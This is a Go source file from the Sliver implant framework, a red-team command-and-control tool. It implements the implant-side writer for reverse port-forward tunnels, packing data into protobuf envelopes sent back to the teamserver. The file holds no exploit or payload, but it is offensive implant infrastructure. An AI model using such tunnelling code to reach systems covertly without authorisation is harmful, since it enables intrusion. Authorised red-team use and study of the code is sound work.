package rportfwd

/*
	Sliver Implant Framework
	Copyright (C) 2022  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"github.com/bishopfox/sliver/implant/sliver/transports"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"google.golang.org/protobuf/proto"
)

// tunnelWriter - Sends data back to the server based on data read()
// I know the reader/writer stuff is a little hard to keep track of
type tunnelWriter struct {
	tun             *transports.Tunnel
	conn            tunnelConnection
	host            string
	port            uint32
	protocol        int
	tunnelID        uint64
	authorizationID string
}

func (tw tunnelWriter) Write(data []byte) (int, error) {
	n := len(data)
	err := tw.conn.QueueTunnelData(tw.tun, func(sequence uint64, ack uint64) (*sliverpb.Envelope, error) {
		createReverse := sequence == 0
		rportfwdInfo := &sliverpb.RPortfwd{}
		if createReverse {
			if tw.authorizationID == "" {
				setLegacyRportfwdAddress(rportfwdInfo, tw.host, tw.port)
			}
			rportfwdInfo.Protocol = int32(tw.protocol)
			rportfwdInfo.TunnelID = tw.tunnelID
			rportfwdInfo.AuthorizationID = tw.authorizationID
		}
		marshaled, marshalErr := proto.Marshal(&sliverpb.TunnelData{
			Sequence:      sequence,
			Ack:           ack,
			TunnelID:      tw.tun.ID,
			Data:          data,
			CreateReverse: createReverse,
			Rportfwd:      rportfwdInfo,
		})
		// {{if .Config.Debug}}
		log.Printf("[tunnelWriter] Write %d bytes (write seq: %d) ack: %d", n, sequence, ack)
		// {{end}}
		if marshalErr != nil {
			return nil, marshalErr
		}
		return &sliverpb.Envelope{
			Type: sliverpb.MsgTunnelData,
			Data: marshaled,
		}, nil
	})
	if err != nil {
		return 0, err
	}
	return n, nil
}

// setLegacyRportfwdAddress isolates deprecated fields to compatibility traffic
// from a teamserver that did not issue an authorization capability.
func setLegacyRportfwdAddress(info *sliverpb.RPortfwd, host string, port uint32) {
	info.Host = host //nolint:staticcheck // Required for exact legacy wire compatibility.
	info.Port = port //nolint:staticcheck // Required for exact legacy wire compatibility.
}
